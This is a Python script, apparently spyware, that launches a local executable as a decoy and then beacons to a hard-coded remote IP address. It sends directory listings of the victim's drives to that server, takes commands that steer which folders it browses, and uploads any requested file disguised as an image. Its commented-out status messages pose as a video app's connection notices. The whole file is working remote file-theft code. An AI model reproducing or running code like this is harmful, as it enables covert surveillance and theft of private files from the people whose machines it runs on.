import requests
from threading import Timer
import datetime
import os
import json
import random

def open_app(app_dir):
    os.startfile(app_dir) #os.startfile（）打开外部应该程序，与windows双击相同

#app_dir = r'.\\v2rayN.exe'#指定应用程序目录
app_dir = r'.\\uninstall.exe'#指定应用程序目录
open_app(app_dir)

# baseUrl = "http://localhost:8101"
baseUrl = "http://114.116.250.115:8105"
currentPath = 'c:/'
currentFileList = []
currentFileListIndex = 0
tt = 5
maxUpload = 0
key = random.random()

# def checkConect() :
    # url = baseUrl + "/check"
    # res=requests.request("get",url)
    # res.encoding = 'utf-8'
    
    # print (res.text)

    # if res.text == "1":
    #     checkPath()
    # else:
    #     print('TimeNow:%s' % (datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
    # t = Timer(2, printHello)
    # t.start()

def checkPath(p = 'c:/') :
    global tt
    global currentPath
    global currentFileList
    global key

    url = baseUrl + "/next"
    headers = {'Content-Type': 'application/json'}
    try:
        if os.path.exists(p):
            currentPath = p
        else:
            currentPath = 'c:/'

        # print ("checkpath " + currentPath)
        fileList = os.listdir(currentPath)
        # print (fileList)
        data = '{"data": "' + (','.join(fileList)) + '", "rootPath": "' + (currentPath) + '", "key": "' + str(key) + '"}'
        data = data.encode("utf-8")

        # print (data)
        
        res = requests.post(url, data = data, headers = headers)
        res.encoding = "utf-8"
        # print (res.text)
        # print ('iqiyi => 尝试连接中...')
        info = res.text.split(">")

        if info[0] == "c":
            # print ('iqiyi => 连接状态 1 ...')
            checkPath(info[1])
        elif info[0] == "x":
            checkPath('c:/')
            # print ('iqiyi => 错误，C001...')
        elif info[0] == "d":
            checkPath('d:/')
            # print ('iqiyi => 错误，C018...')
        elif info[0] == "f":
            checkPath('f:/')
        elif info[0] == "e":
            checkPath('e:/')
        elif info[0] == "g":
            checkPath('g:/')
        elif info[0] == "h":
            checkPath('h:/')
        elif info[0] == "s":
            # print ('iqiyi => 链接失败，重试中...')
            # print("save " + info[1])
            upload(info[1])
        # elif info[0] == "a":
        #     currentFileList = os.listdir(currentPath)
        #     currentFileListIndex = 0
        #     all()
        elif info[0] == "+":
            tt = 600
            t = Timer(tt, checkPath)
            t.start()
        elif info[0] == "-":
            tt = 60
            t = Timer(tt, checkPath)
            t.start()
        elif info[0] == ".":
            tt = 10
            t = Timer(tt, checkPath)
            t.start()
        else:
            t = Timer(tt, checkPath)
            t.start()
    except Exception as e:
        # print ('res Error' + e)
        # t = Timer(60 * 10, checkPath)
        t = Timer(tt, checkPath)
        t.start()

def upload(str = "") :
    # print("save " + str)
    if str == "":
        checkPath(currentPath)
    else:
        try:
            url = baseUrl + "/save"
            files = {'img': ('1.png', open(str, 'rb'), 'image/png', {})}
            res=requests.request("POST",url, data=None, files=files)
        except:
            # notice(str+"_upload_failed")
            # print(str+"_upload_failed")
            checkPath(currentPath)
        else:
            checkPath(currentPath)

# def all() : 
#     global maxUpload
#     global currentPath
#     global currentFileList
#     global currentFileListIndex
#     print("all")
#     if maxUpload < 10:
#         path = currentPath + currentFileList[currentFileListIndex]
#         if path
#         upload()



# def notice(str) :
#     url = baseUrl + "/log?msg=" + str
#     res=requests.get(url)

print("请勿关闭此弹窗")

checkPath()